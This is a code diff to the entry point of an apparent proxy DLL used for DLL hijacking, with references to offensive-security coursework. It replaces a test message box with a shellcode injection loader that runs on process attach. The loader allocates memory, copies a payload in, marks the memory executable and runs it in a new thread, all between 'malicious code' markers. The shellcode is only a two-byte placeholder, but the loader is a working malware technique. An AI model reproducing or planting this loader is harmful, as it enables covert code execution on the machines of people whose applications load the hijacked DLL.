@@ -7,6 +7,7 @@
 // dllmain.cpp : Defines the entry point for the DLL application.
 #include "pch.h"
 #include <Windows.h>
+#include <cstring>
 #include "OSEPGlobals.h"
 
 //Proxy Statements
@@ -29,7 +30,65 @@ BOOL APIENTRY DllMain( HMODULE hModule,
     {
     case DLL_PROCESS_ATTACH:
     {
-        MessageBoxA(NULL, "Executing from Malicious DLL", "Executing from Malicious DLL", 0);
+        //START MALICIOUS CODE
+
+
+        //Shellcode Injection Example (Maldev Academy)
+
+        unsigned char SHELLCODE[] = { 0xfc,0x48 };
+
+        PBYTE pDeobfuscatedPayload = SHELLCODE;
+        SIZE_T sDeobfuscatedSize = sizeof(SHELLCODE);
+
+        PVOID pShellcodeAddress = VirtualAlloc(
+            nullptr,
+            sDeobfuscatedSize,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_READWRITE
+        );
+
+        if (pShellcodeAddress == nullptr)
+            return 1;
+
+        memcpy(pShellcodeAddress, pDeobfuscatedPayload, sDeobfuscatedSize);
+        memset(pDeobfuscatedPayload, 0x00, sDeobfuscatedSize);
+
+        DWORD oldProtection;
+
+        if (!VirtualProtect(
+            pShellcodeAddress,
+            sDeobfuscatedSize,
+            PAGE_EXECUTE_READWRITE,
+            &oldProtection))
+        {
+            VirtualFree(pShellcodeAddress, 0, MEM_RELEASE);
+            return 1;
+        }
+
+        HANDLE hThread = CreateThread(
+            nullptr,
+            0,
+            reinterpret_cast<LPTHREAD_START_ROUTINE>(pShellcodeAddress),
+            nullptr,
+            0,
+            nullptr
+        );
+
+        if (hThread != nullptr) {
+            WaitForSingleObject(hThread, INFINITE);
+            CloseHandle(hThread);
+        }
+
+        VirtualFree(pShellcodeAddress, 0, MEM_RELEASE);
+
+        return 0;
+        //END MALICIOUS CODE
+
+
+
+
+
+
     }
     case DLL_THREAD_ATTACH:
         break;
